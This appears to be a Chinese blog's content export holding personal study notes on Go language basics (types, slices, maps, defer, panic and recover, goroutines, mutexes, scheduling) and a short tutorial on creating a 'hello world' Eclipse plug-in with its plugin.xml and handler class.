fallthrough if range typecontinue for import return var 内建常量: true false iota nil内建类型: int int8 int16 int32 int64 uint uint8 uint16 uint32 uint64 uintptr float32 float64 complex128 complex64 bool byte rune string error内建函数: make len cap new append copy close delete complex real imag panic recover 可见范围： 如果一个名字是在函数内部定义，那么它就只在函数内部有效。 如果是在函数外部定义，那么将在当前包的所有文件中都可以访问。 如果一个名字是大写字母开头的（译注：必须是在函数外部定义的包级名字；包级函数名本身也是包级名字），那么它将是导出的，也就是说可以被外部的包访问。 声明四种声明形式： var、const、type和func，分别对应变量、常量、类型和函数实体对象的声明。 123456789101112package mainimport &quot;fmt&quot;type my intfunc main() &#123; const i = 3.14 var j = i / 2 const a my = 1 fmt.Println(j, a)&#125; 变量123456789var 变量名字 类型 = 表达式 // 去掉表达式会赋默认值，去掉类型会根据表达式来设定类型var s stringfmt.Println(s) // &quot;&quot;// 多变量声明var i, j, k int // int, int, intvar b, f, s = true, 2.3, &quot;four&quot; // bool, float64, string// 函数声明var f, err = os.Open(name) // os.Open returns a file and an error 简短变量声明 1234i := 100j, k := 200, 300i, j = j, i // 交换 i 和 j 的值 注意： “:=”是一个变量声明语句，而“=”是一个变量赋值操作。 new函数每次调用new函数都是返回一个新的变量的地址，因此下面两个地址是不同的： 123p :&#x3D; new(int)q :&#x3D; new(int)fmt.Println(p &#x3D;&#x3D; q) &#x2F;&#x2F; &quot;false&quot; new函数使用通常相对比较少，因为对于结构体来说，直接用字面量语法创建新变量的方法会更灵活（§4.4.1）。 由于new只是一个预定义的函数，它并不是一个关键字，因此我们可以将new名字重新定义为别的类型。例如下面的例子： 1func delta(old, new int) int &#123; return new - old &#125; 由于new被定义为int类型的变量名，因此在delta函数内部是无法使用内置的new函数的。 指针12345x := 1p := &amp;x // p, of type *int, points to xfmt.Println(*p) // &quot;1&quot;*p = 2 // equivalent to x = 2fmt.Println(x) // &quot;2&quot; 变量的生命周期对于在包一级声明的变量来说，它们的生命周期和整个程序的运行周期是一致的。 而相比之下，局部变量的生命周期则是动态的：每次从创建一个新变量的声明语句开始，直到该变量不再被引用为止，然后变量的存储空间可能被回收。 123456789101112var global *intfunc f() &#123; var x int x = 1 global = &amp;x&#125;func g() &#123; y := new(int) *y = 1&#125; f函数里的x变量必须在堆上分配，因为它在函数退出后依然可以通过包一级的global变量找到，虽然它是在函数内部定义的；用Go语言的术语说，这个x局部变量从函数f中逃逸了。相反，当g函数返回时，变量*y将是不可达的，也就是说可以马上被回收的。因此，*y并没有从函数g中逃逸，编译器可以选择在栈上分配*y的存储空间（译注：也可以选择在堆上分配，然后由Go语言的GC回收这个变量的内存空间），虽然这里用的是new方式。其实在任何时候，你并不需为了编写正确的代码而要考虑变量的逃逸行为，要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响。 作用域句法块是由花括弧所包含的一系列语句，就像函数体或循环体花括弧包裹的内容一样。句法块内部声明的名字是无法被外部块访问的。 对全局的源代码来说，存在一个整体的词法块，称为全局词法块；对于每个包；每个for、if和switch语句，也都有对应词法块；每个switch或select的分支也有独立的词法块；当然也包括显式书写的词法块（花括弧包含的语句）。 声明语句对应的词法域决定了作用域范围的大小。对于内置的类型、函数和常量，比如int、len和true等是在全局作用域的，因此可以在整个程序中直接使用。任何在函数外部（也就是包级语法域）声明的名字可以在同一个包的任何源文件中访问的。对于导入的包，例如tempconv导入的fmt包，则是对应源文件级的作用域，因此只能在当前的文件中访问导入的fmt包，当前包的其它源文件无法访问在当前源文件导入的包。还有许多声明语句，比如tempconv.CToF函数中的变量c，则是局部作用域的，它只能在函数内部（甚至只能是局部的某些部分）访问。 基础数据类型操作符优先级 12345* / % &lt;&lt; &gt;&gt; &amp; &amp;^+ - | ^== != &lt; &lt;= &gt; &gt;=&amp;&amp;|| 操作符 123456789101112131415161718== 等于!= 不等于&lt; 小于&lt;= 小于等于&gt; 大于&gt;= 大于等于// 一元的加法和减法运算符：+ 一元加法（无效果）- 负数// 位操作运算符&amp; 位运算 AND| 位运算 OR^ 位运算 XOR&amp;^ 位清空（AND NOT）&lt;&lt; 左移&gt;&gt; 右移 整数12345Go语言同时提供了有符号和无符号类型的整数运算。这里有int8、int16、int32和int64四种截然不同大小的有符号整数类型，分别对应8、16、32、64bit大小的有符号整数，与此对应的是uint8、uint16、uint32和uint64四种无符号整数类型。其中有符号整数采用2的补码形式表示，也就是最高bit位用来表示符号位，一个n-bit的有符号数的值域是从-2n-1到2n-1-1。无符号整数的所有bit位都用于表示非负数，值域是0到2n-1。 int和unit的区别： 浮点数1234Go语言提供了两种精度的浮点数，float32和float64。常量math.MaxFloat32表示float32能表示的最大数值，大约是 3.4e38；对应的math.MaxFloat64常量大约是1.8e308。它们分别能表示的最小值近似为1.4e-45和4.9e-324。 复数1Go语言提供了两种精度的复数类型：complex64和complex128，分别对应float32和float64两种浮点数精度。 12345var x complex128 = complex(1, 2) // 1+2ivar y complex128 = complex(3, 4) // 3+4ifmt.Println(x*y) // &quot;(-5+10i)&quot;fmt.Println(real(x*y)) // &quot;-5&quot;fmt.Println(imag(x*y)) // &quot;10&quot; 数组数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。 123456789101112131415161718192021var a [3]int // 长度为3 默认值都为0var a [3]int = [3]int&#123;1, 2, 3&#125; // 带默认值var a = [...]int&#123;1, 2, 3&#125; // 省略号会自己计算长度// 数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量表达式，因为数组的长度需要在编译阶段确定。q := [3]int&#123;1, 2, 3&#125;q = [4]int&#123;1, 2, 3, 4&#125; // compile error: cannot assign [4]int to [3]int// 指定index位置symbol := [...]string&#123;2: &quot;$&quot;, 3: &quot;€&quot;, 1: &quot;￡&quot;, 0: &quot;￥&quot;&#125;fmt.Println(symbol) // [￥ ￡ $ €]// 只有当两个数组的所有元素都是相等的时候数组才是相等的a := [2]int&#123;1, 2&#125;b := [...]int&#123;1, 2&#125;c := [2]int&#123;1, 3&#125;fmt.Println(a == b, a == c, b == c) // &quot;true false false&quot;d := [3]int&#123;1, 2&#125;fmt.Println(a == d) // compile error: cannot compare [2]int == [3]int 切片SliceSlice（切片）代表变长的序列，序列中每个元素都有相同的类型。一个slice类型一般写作[]T，其中T代表slice中元素的类型；slice的语法和数组很像，只是没有固定长度而已。 Slice底层是数组，有len和cap，扩容的时候cap * 2，数据是引用的话改变可能会影响其他的Slice。 Slice没有==判断，因为如果有的话会去比较里面的各个值，里面的值可能是Slice或者interface。 123456789101112131415s := []int&#123;0, 1, 2, 3, 4, 5&#125;fmt.Println(s[1:]) // [1 2 3 4 5]fmt.Println(s[1:3]) // [1 2]fmt.Println(s[:3]) // [0 1 2]fmt.Println(s[:]) // [0 1 2 3 4 5]// 测试一个slice是否是空的，使用len(s) == 0来判断，而不应该用s == nil来判断。var s []int // len(s) == 0, s == nils = nil // len(s) == 0, s == nils = []int(nil) // len(s) == 0, s == nils = []int&#123;&#125; // len(s) == 0, s != nil// 使用make创建make([]T, len)make([]T, len, cap) // same as make([]T, cap)[:len] 底层是数组 append后由于没有空间了，会重新申请一个cap为8的数组。 这样会导致内存的重新分配，所以通常将append的结果在返给原来的变量 1runes = append(runes, r) Map12345678910111213141516171819202122// Map是一个无序的key/value对的集合，其中所有的key都是不同的，然后通过给定的key可以在常数时间复杂度内检索、更新或删除对应的value。// Map的key必须是支持==比较运算符的数据类型。// 通过make来创建Mapages := make(map[string]int) // mapping from strings to ints// 普通创建，可以赋值ages := map[string]int&#123; &quot;alice&quot;: 31, &quot;charlie&quot;: 34,&#125;// 赋值与获取ages[&quot;alice&quot;] = 32fmt.Println(ages[&quot;alice&quot;]) // &quot;32&quot;// 删除delete(ages, &quot;alice&quot;) // remove element ages[&quot;alice&quot;]// 遍历for name, age := range ages &#123; fmt.Printf(&quot;%s\\t%d\\n&quot;, name, age)&#125; Struct123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport &quot;fmt&quot;type Person struct &#123; Name string Age int Height float64&#125;type Man struct &#123; Person // 匿名嵌入Person类型 Sex string&#125;func main() &#123; p := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125; fmt.Println(p) p.Age = 31 fmt.Println(p) m := Man&#123;Person: Person&#123;Name: &quot;Bob&quot;, Age: 25&#125;, Sex: &quot;M&quot;&#125; fmt.Println(m) m.Age = 26 fmt.Println(m) per := m.Person per.Age = 27 fmt.Println(m) p1 := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125; p2 := Person&#123;Name: &quot;Bob&quot;, Age: 25, Height: 180.0&#125; p3 := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125; fmt.Println(p1 == p2, p1 == p3, p2 == p3) w := Woman&#123;Person: Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125;&#125; fmt.Println(w == p1)&#125;==============&#123;Alice 30 165&#125;&#123;Alice 31 165&#125;&#123;&#123;Bob 25 0&#125; M&#125;&#123;&#123;Bob 26 0&#125; M&#125;&#123;&#123;Bob 26 0&#125; M&#125;false true falseinvalid operation: w == p1 (mismatched types Woman and Person) JSON123456789101112p := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125;data, _ := json.MarshalIndent(p, &quot;&quot;, &quot; &quot;)fmt.Printf(&quot;%s\\n&quot;, data) // JSON输出 不格式化p := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125;data, _ := json.MarshalIndent(p, &quot;&quot;, &quot; &quot;)fmt.Printf(&quot;%s\\n&quot;, data) // JSON输出 格式化p = Person&#123;&#125;s := &quot;&#123;\\&quot;Name\\&quot;:\\&quot;Alice\\&quot;,\\&quot;Age\\&quot;:30,\\&quot;Height\\&quot;:165&#125;&quot;json.Unmarshal([]byte(s), &amp;p) // json反序列化fmt.Printf(&quot;%+v\\n&quot;, p) 函数函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。 123func name(parameter-list) (result-list) &#123; body&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970func add(x int, y int) int &#123;return x + y&#125;func sub(x, y int) (z int) &#123; z = x - y; return&#125;func first(x int, _ int) int &#123; return x &#125;func zero(int, int) int &#123; return 0 &#125;// func可以当匿名函数a := func() &#123;&#125;a()// Slice引用传递func main() &#123; a := []int&#123;0, 0&#125; A(a) fmt.Println(a)&#125;func A(a []int) &#123; a[0] = 1 a[1] = 1&#125;// [1 1]// 数组 值传递func main() &#123; a := [2]int&#123;0, 0&#125; A(a) fmt.Println(a)&#125;func A(a [2]int) &#123; a[0] = 1 a[1] = 1&#125;// int 类型func main() &#123; a := 0 A(a) fmt.Println(a)&#125;func A(a int) &#123; a = 1&#125;// 0// 对象func main() &#123; p := Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125; A(p) fmt.Println(p)&#125;func A(a Person) &#123; a.Age = 1&#125;// &#123;Alice 30 165&#125;// 对象指针func main() &#123; p := Man&#123;Person: Person&#123;Name: &quot;Alice&quot;, Age: 30, Height: 165.0&#125;, Sex: &quot;female&quot;&#125; A(&amp;p) fmt.Println(p)&#125;func A(a *Man) &#123; a.Person.Age = 1&#125;// &#123;&#123;Alice 1 165&#125; female&#125; 函数像其他值一样，拥有类型，可以被赋值给其他变量，传递给函数，从函数返回。 12345678910111213func square(n int) int &#123; return n * n &#125;func negative(n int) int &#123; return -n &#125;func product(m, n int) int &#123; return m * n &#125;f := squarefmt.Println(f(3)) // &quot;9&quot;f = negativefmt.Println(f(3)) // &quot;-3&quot;fmt.Printf(&quot;%T\\n&quot;, f) // &quot;func(int) int&quot;f = product // compile error: can&#x27;t assign func(int, int) int to func(int) int 函数类型的零值是nil。调用值为nil的函数值会引起panic错误，函数只能和nil比较，不能和函数比较。 1234567var f func(int) intf(3) // 此处f的值为nil, 会引起panic错误var f func(int) intif f != nil &#123; // 可以和nil比较 f(3)&#125; 函数当做参数传参 12345func add1(r rune) rune &#123; return r + 1 &#125;fmt.Println(strings.Map(add1, &quot;HAL-9000&quot;)) // &quot;IBM.:111&quot;fmt.Println(strings.Map(add1, &quot;VMS&quot;)) // &quot;WNT&quot;fmt.Println(strings.Map(add1, &quot;Admix&quot;)) // &quot;Benjy&quot; 可变参数 1234567891011func sum(vals ...int) int &#123; total := 0 for _, val := range vals &#123; total += val &#125; return total&#125;fmt.Println(sum()) // &quot;0&quot;fmt.Println(sum(3)) // &quot;3&quot;fmt.Println(sum(1, 2, 3, 4)) // &quot;10&quot; Deferreddefer关键字的作用：包含该defer语句的函数执行完毕时，defer后的函数才会被执行，不论包含defer语句的函数是通过return正常结束，还是由于panic导致的异常结束。你可以在一个函数中执行多条defer语句，它们的执行顺序与声明顺序相反。 处理互斥锁 1234567var mu sync.Mutexvar m = make(map[string]int)func lookup(key string) int &#123; mu.Lock() defer mu.Unlock() return m[key]&#125; 记录调用时间 1234567891011121314151617181920func bigSlowOperation() &#123; // 不要忘记defer语句后的圆括号，否则本该在进入时执行的操作会在退出时执行，而本该在退出时执行的，永远不会被执行。 // 如果不加括号的话 会在return后直接打印enter defer trace(&quot;bigSlowOperation&quot;)() // don&#x27;t forget the extra parentheses // ...lots of work… time.Sleep(10 * time.Second) // simulate slow operation by sleeping&#125;func trace(msg string) func() &#123; start := time.Now() log.Printf(&quot;enter %s&quot;, msg) return func() &#123; log.Printf(&quot;exit %s (%s)&quot;, msg,time.Since(start)) &#125;&#125;--------------2023/04/28 14:31:53 enter main142023/04/28 14:31:53 exit main (141.096µs) Panic异常Panic异常指的是运行中的异常，如数组越界、空指针等，当panic异常发生时，程序会中断运行，并立即执行在该goroutine中被延迟的函数（defer 机制），由于panic会导致程序中断运行，所以一般用来当一些必要参数缺失时候 可以使用panic。 12345678// regexp.MustCompile()方法func MustCompile(str string) *Regexp &#123; regexp, err := Compile(str) if err != nil &#123; panic(`regexp: Compile(` + quote(str) + `): ` + err.Error()) &#125; return regexp&#125; panic会执行在defer之后，在Go的panic机制中，延迟函数的调用在释放堆栈信息之前。 123456789101112131415161718func main() &#123; defer trace(&quot;main&quot;)() // 打印: exit main (100ms) j := 0 i := 1 / j fmt.Println(i)&#125;--------------2023/04/28 14:53:24 enter main142023/04/28 14:53:24 exit main (157.698µs)panic: runtime error: integer divide by zerogoroutine 1 [running]:main.main() /Users/fireflying/go/src/test/main.go:31 +0xeeexit status 2 Recover捕获异常当web服务器遇到不可预料的严重问题时，在崩溃前应该将所有的连接关闭；如果不做任何处理，会使得客户端一直处于等待状态。 就好比regexp.MustCompile()方法，如果它panic异常了，是不是程序就中断了，对于web服务器来说，这会导致服务崩溃。 如果在deferred函数中调用了内置函数recover，并且定义该defer语句的函数发生了panic异常，recover会使程序从panic中恢复，并返回panic value。导致panic异常的函数不会继续运行，但能正常返回。在未发生panic时调用recover，recover会返回nil。 1234567891011func main() &#123; defer func() &#123; // 使用recover()捕获panic产生的异常。 if p := recover(); p != nil &#123; log.Printf(&quot;run time panic: %v&quot;, p) &#125; &#125;() j := 0 i := 1 / j fmt.Println(i)&#125; 可以使用switch来对recover进行类型判断，通过不同的类型来处理 12345678910111213141516171819202122232425262728// soleTitle returns the text of the first non-empty title element// in doc, and an error if there was not exactly one.func soleTitle(doc *html.Node) (title string, err error) &#123; type bailout struct&#123;&#125; defer func() &#123; switch p := recover(); p &#123; case nil: // no panic case bailout&#123;&#125;: // &quot;expected&quot; panic err = fmt.Errorf(&quot;multiple title elements&quot;) default: panic(p) // unexpected panic; carry on panicking &#125; &#125;() // Bail out of recursion if we find more than one nonempty title. forEachNode(doc, func(n *html.Node) &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == &quot;title&quot; &amp;&amp; n.FirstChild != nil &#123; if title != &quot;&quot; &#123; panic(bailout&#123;&#125;) // multiple titleelements &#125; title = n.FirstChild.Data &#125; &#125;, nil) if title == &quot;&quot; &#123; return &quot;&quot;, fmt.Errorf(&quot;no title element&quot;) &#125; return title, nil&#125; 方法123456789101112131415package geometryimport &quot;math&quot;type Point struct&#123; X, Y float64 &#125;// 传统的方法func Distance(p, q Point) float64 &#123; return math.Hypot(q.X-p.X, q.Y-p.Y)&#125;// Point类型的方法func (p Point) Distance(q Point) float64 &#123; return math.Hypot(q.X-p.X, q.Y-p.Y)&#125; 上面的在方法名之前加了个(p Point)，则表示这个方法是Point类型的独占方法，p叫做方法的接收器（receiver）。 reveiver甚至可以为int 12345type Hello intfunc (h Hello) a() &#123;&#125; 但是reveiver不能为指针，因为如果一个类型名本身是一个指针的话，是不允许其出现在接收器中的 123456type Hello *intfunc (h Hello) a() &#123;&#125;// invalid receiver type Hello (pointer or interface type)compilerInvalidRecv 嵌入构造体 1234567891011121314151617type Person struct &#123; Name string Age int Height float64&#125;type Man struct &#123; Person // 匿名嵌入Person类型 Sex string&#125;func main() &#123; man := Man&#123;Person: Person&#123;Name: &quot;hel&quot;, Age: 18&#125;, Sex: &quot;male&quot;&#125; // 可以直接man.Age 而不用man.Person.Age fmt.Println(man.Age) man.Age = 20&#125; 接口接口类型是一种抽象的类型。它不会暴露出它所代表的对象的内部值的结构和这个对象支持的基础操作的集合；它们只会表现出它们自己的方法。也就是说当你有看到一个接口类型的值时，你不知道它是什么，唯一知道的就是可以通过它的方法来做什么。 下面是一个简单的接口实现 1234567891011type A interface &#123; Show()&#125;type B struct &#123; Name string&#125;func (b B) Show() &#123; fmt.Printf(&quot;name is %s&quot;, b.Name)&#125; 接口组合 12345678type A interface &#123; Show()&#125;type C interface &#123; A Run()&#125; 并发线程在Go语言中，每一个并发的执行单元叫作一个goroutine，主函数返回时，所有的goroutine都会被直接打断，程序退出。 12345678910111213141516171819202122func main() &#123; go spinner(100 * time.Millisecond) const n = 45 fibN := fib(n) // slow fmt.Printf(&quot;\\rFibonacci(%d) = %d\\n&quot;, n, fibN)&#125;func spinner(delay time.Duration) &#123; for &#123; for _, r := range `-\\|/` &#123; fmt.Printf(&quot;\\r%c&quot;, r) time.Sleep(delay) &#125; &#125;&#125;func fib(x int) int &#123; if x &lt; 2 &#123; return x &#125; return fib(x-1) + fib(x-2)&#125; channelchannels则是goroutine之间的通信机制，一个channel可以让一个goroutine给另一个goroutine发送东西。 可以用make(chan int)来创建一个int的管道。 close() 来关闭一个channel。 可以使用for range来遍历channel。 channel带缓存 make(chan, 3)：表示创建缓存为3的channel。 Selectselect用于处理多个channel。 select会有一个default来设置当其它的操作都不能够马上被处理时程序需要执行哪些逻辑。 如果多个case同时就绪时，select会随机地选择一个执行，这样来保证每一个channel都有平等的被select的机会。 12345678ch := make(chan int, 1)for i := 1; i &lt; 10; i++ &#123; select &#123; case x := &lt;-ch: fmt.Println(x) // &quot;0&quot; &quot;2&quot; &quot;4&quot; &quot;6&quot; &quot;8&quot; case ch &lt;- i: &#125;&#125; sync.Mutex互斥锁1234567891011121314151617func main() &#123; result := 0 var mu = sync.Mutex&#123;&#125; for i := 0; i &lt; 10; i++ &#123; go func() &#123; for j := 0; j &lt; 10000; j++ &#123; mu.Lock() result++ mu.Unlock() &#125; fmt.Println(&quot;func done!&quot;) &#125;() &#125; time.Sleep(5 * time.Second) fmt.Println(result)&#125; sync.RWMutex读写锁12345678910111213141516171819202122232425262728293031323334353637import ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)var mu sync.RWMutexvar account intfunc main() &#123; go func() &#123; for i := 0; i &lt; 10000; i++ &#123; addAccount(1) &#125; &#125;() go func() &#123; for i := 0; i &lt; 100000; i++ &#123; a := getAccount() fmt.Println(a) &#125; &#125;() time.Sleep(1 * time.Second)&#125;func addAccount(num int) &#123; mu.Lock() defer mu.Unlock() account += num&#125;func getAccount() int &#123; mu.RLock() defer mu.RUnlock() return account&#125; RWMutex格式定义 1234567type RWMutex struct &#123; w Mutex // held if there are pending writers writerSem uint32 // semaphore for writers to wait for completing readers readerSem uint32 // semaphore for readers to wait for completing writers readerCount atomic.Int32 // number of pending readers readerWait atomic.Int32 // number of departing readers&#125; sync.Once惰性初始化每一次对Do(loadIcons)的调用都会锁定mutex，并会检查boolean变量（译注：Go1.9中会先判断boolean变量是否为1(true)，只有不为1才锁定mutex，不再需要每次都锁定mutex）。在第一次调用时，boolean变量的值是false，Do会调用loadIcons并会将boolean变量设置为true。 代码如下 1234567var loadIconsOnce sync.Oncevar icons map[string]image.Image// Concurrency-safe.func Icon(name string) image.Image &#123; loadIconsOnce.Do(loadIcons) return icons[name]&#125; Once里面定义了一个Mutex，如果done==0的话执行o.doSlow方法。 1234567891011121314151617181920func (o *Once) Do(f func()) &#123; // Note: Here is an incorrect implementation of Do: // // if atomic.CompareAndSwapUint32(&amp;o.done, 0, 1) &#123; // f() // &#125; // // Do guarantees that when it returns, f has finished. // This implementation would not implement that guarantee: // given two simultaneous calls, the winner of the cas would // call f, and the second would return immediately, without // waiting for the first&#x27;s call to f to complete. // This is why the slow path falls back to a mutex, and why // the atomic.StoreUint32 must be delayed until after f returns. if atomic.LoadUint32(&amp;o.done) == 0 &#123; // Outlined slow-path to allow inlining of the fast-path. o.doSlow(f) &#125;&#125; o.doSlow里面会使用Mutex的lock和Unlock进行锁操作。 12345678func (o *Once) doSlow(f func()) &#123; o.m.Lock() defer o.m.Unlock() if o.done == 0 &#123; defer atomic.StoreUint32(&amp;o.done, 1) f() &#125;&#125; 竞争条件检测只要在go build，go run或者go test命令后面加上-race的flag，就会使编译器创建一个你的应用的“修改”版或者一个附带了能够记录所有运行期对共享变量访问工具的test，并且会记录下每一个读或者写共享变量的goroutine的身份信息。另外，修改版的程序会记录下所有的同步事件，比如go语句，channel操作，以及对(*sync.Mutex).Lock，(*sync.WaitGroup).Wait等等的调用。 goroutine栈每一个OS线程都有一个固定大小的内存块（一般会是2MB）来做栈，这个栈会用来存储当前正在被调用或挂起（指在调用其它函数时）的函数的内部变量。而一个goroutine会以一个很小的栈开始其生命周期，一般只需要2KB。一个goroutine的栈，和操作系统线程一样，会保存其活跃或挂起的函数调用的本地变量，但是和OS线程不太一样的是，一个goroutine的栈大小并不是固定的；栈的大小会根据需要动态地伸缩。而goroutine的栈的最大值有1GB。 调度OS线程会被操作系统内核调度。每几毫秒，一个硬件计时器会中断处理器，这会调用一个叫作scheduler的内核函数。这个函数会挂起当前执行的线程并将它的寄存器内容保存到内存中，检查线程列表并决定下一次哪个线程可以被运行，并从内存中恢复该线程的寄存器信息，然后恢复执行该线程的现场并开始执行线程。因为操作系统线程是被内核所调度，所以从一个线程向另一个“移动”需要完整的上下文切换，也就是说，保存一个用户线程的状态到内存，恢复另一个线程的到寄存器，然后更新调度器的数据结构。 和操作系统的线程调度不同的是，Go调度器并不是用一个硬件定时器，而是被Go语言“建筑”本身进行调度的。例如当一个goroutine调用了time.Sleep，或者被channel调用或者mutex操作阻塞时，调度器会使其进入休眠并开始执行另一个goroutine，直到时机到了再去唤醒第一个goroutine。因为这种调度方式不需要进入内核的上下文，所以重新调度一个goroutine比调度一个线程代价要低得多。 GOMAXPROCSGo的调度器使用了一个叫做GOMAXPROCS的变量来决定会有多少个操作系统的线程同时执行Go的代码。其默认的值是运行机器上的CPU的核心数，所以在一个有8个核心的机器上时，调度器一次会在8个OS线程上去调度GO代码。（GOMAXPROCS是前面说的m:n调度中的n）。在休眠中的或者在通信中被阻塞的goroutine是不需要一个对应的线程来做调度的。在I/O中或系统调用中或调用非Go语言函数时，是需要一个对应的操作系统线程的，但是GOMAXPROCS并不需要将这几种情况计算在内。 包Go语言的闪电般的编译速度主要得益于三个语言特性。 第一点，所有导入的包必须在每个文件的开头显式声明，这样的话编译器就没有必要读取和分析整个源文件来判断包的依赖关系。 第二点，禁止包的环状依赖，因为没有循环依赖，包的依赖关系形成一个有向无环图，每个包可以被独立编译，而且很可能是被并发编译。 第三点，编译后包的目标文件不仅仅记录包本身的导出信息，目标文件同时还记录了包的依赖关系。因此，在编译一个包的时候，编译器只需要读取每个直接导入包的目标文件，而不需要遍历所有依赖的的文件。 包的匿名导入： 我们只是想利用导入包而产生的副作用：它会计算包级变量的初始化表达式和执行导入包的init初始化函数 1import _ &quot;image/png&quot; // register PNG decoder 数据库包database/sql也是采用了类似的技术，让用户可以根据自己需要选择导入必要的数据库驱动。例如： 123456789import ( &quot;database/sql&quot; _ &quot;github.com/lib/pq&quot; // enable support for Postgres _ &quot;github.com/go-sql-driver/mysql&quot; // enable support for MySQL)db, err = sql.Open(&quot;postgres&quot;, dbname) // OKdb, err = sql.Open(&quot;mysql&quot;, dbname) // OKdb, err = sql.Open(&quot;sqlite3&quot;, dbname) // returns error: unknown driver &quot;sqlite3&quot; 打包打包指定操作系统和内核。 GOOS环境变量用于指定目标操作系统（例如android、linux、darwin或windows） GOARCH环境变量用于指定处理器的类型，例如amd64、386或arm等 1GOOS=linux GOARCH=amd64 go build","categories":[{"name":"go","slug":"go","permalink":"http://fireflyingup.github.io/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"http://fireflyingup.github.io/tags/go/"}]},{"title":"搭建一个简单eclipse插件项目","slug":"搭建一个简单eclipse插件项目","date":"2022-06-23T15:36:14.000Z","updated":"2023-12-19T01:38:53.822Z","comments":true,"path":"2022/06/23/搭建一个简单eclipse插件项目/","link":"","permalink":"http://fireflyingup.github.io/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"引言​ 这里主要记录如何手把手搭建一个eclipse的插件项目。 引入插件​ 由于eclipse插件开发需要plugin插件，所以要先去Help-&gt;Install New Software-&gt;选择对应ecipse版本的https://download.eclipse.org/releases/2022-06/202206151000下载地址-&gt;选择General Purpose Tools下的Eclipse Plug-in Development Environment，然后一路next-&gt;accept-&gt;finish，重启就可以创建一个plugin项目了。 新建项目填入项目名称 点击next，填写vender信息，勾选Generate an activator 点击next，选择创建一个模版，这里选择hello world。 点击next，构建一个handler。 创建完之后我们看下目录结构 文件分析目录里面主要的是plugin.xml这个文件，下面对这个文件进行解析，梳理页面与执行SampleHandler的逻辑。 plugin.xml文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?eclipse version=&quot;3.4&quot;?&gt;&lt;plugin&gt; &lt;extension point=&quot;org.eclipse.ui.commands&quot;&gt; &lt;category id=&quot;demo1.commands.category&quot; name=&quot;Sample Category&quot;&gt; &lt;/category&gt; &lt;!-- 这里定义一个command id为demo1.commands.sampleCommand --&gt; &lt;command categoryId=&quot;demo1.commands.category&quot; name=&quot;Sample Command&quot; id=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/command&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.handlers&quot;&gt; &lt;!-- 将上面定义的command 指定handler处理器，也就是SampleHandler这个类 --&gt; &lt;handler class=&quot;demo1.handlers.SampleHandler&quot; commandId=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/handler&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.bindings&quot;&gt; &lt;key commandId=&quot;demo1.commands.sampleCommand&quot; schemeId=&quot;org.eclipse.ui.defaultAcceleratorConfiguration&quot; contextId=&quot;org.eclipse.ui.contexts.window&quot; sequence=&quot;M1+6&quot;&gt; &lt;/key&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.menus&quot;&gt; &lt;menuContribution locationURI=&quot;menu:org.eclipse.ui.main.menu?after=additions&quot;&gt; &lt;!-- 指定一个菜单，菜单显示为Sample Menu --&gt; &lt;menu id=&quot;demo1.menus.sampleMenu&quot; label=&quot;Sample Menu&quot; mnemonic=&quot;M&quot;&gt; &lt;!-- 将前面注册的command绑定到这个菜单里面 --&gt; &lt;command commandId=&quot;demo1.commands.sampleCommand&quot; id=&quot;demo1.menus.sampleCommand&quot; mnemonic=&quot;S&quot;&gt; &lt;/command&gt; &lt;/menu&gt; &lt;/menuContribution&gt; &lt;menuContribution locationURI=&quot;toolbar:org.eclipse.ui.main.toolbar?after=additions&quot;&gt; &lt;toolbar id=&quot;demo1.toolbars.sampleToolbar&quot;&gt; &lt;command id=&quot;demo1.toolbars.sampleCommand&quot; commandId=&quot;demo1.commands.sampleCommand&quot; icon=&quot;icons/sample.png&quot; tooltip=&quot;Say hello world&quot;&gt; &lt;/command&gt; &lt;/toolbar&gt; &lt;/menuContribution&gt; &lt;/extension&gt;&lt;/plugin&gt; SampleHandler.java 文件 1234567891011121314151617181920212223package demo1.handlers;import org.eclipse.core.commands.AbstractHandler;import org.eclipse.core.commands.ExecutionEvent;import org.eclipse.core.commands.ExecutionException;import org.eclipse.ui.IWorkbenchWindow;import org.eclipse.ui.handlers.HandlerUtil;import org.eclipse.jface.dialogs.MessageDialog;public class SampleHandler extends AbstractHandler &#123; @Override public Object execute(ExecutionEvent event) throws ExecutionException &#123; IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindowChecked(event); // 推送弹窗，打印Hello, This is a demo plugin!!! MessageDialog.openInformation( window.getShell(), &quot;Demo1&quot;, &quot;Hello, This is a demo plugin!!!&quot;); return null; &#125;&#125; 还有一个Activator类，这个是对插件的生命周期进行管理 getDefault() 取得插件类的实例的方法。插件类是单例的，所以这个方法作为一个静态方法提供。 start() 插件开始时的处理。 stop() 插件停止时的处理。 getLog() log输出时取得ILog用的方法。 getImageRegistry() 取得管理插件内图像的ImageRegistry类。 getPerferenceStore() 取得保存插件设定的IPerferenceStore类。 getDialogSettings() 取得保存对话框设定的IDialogSettings类。 getWorkbench() 取得IWorkbench的实例。 执行调试插件点击左上角的绿色启动按钮 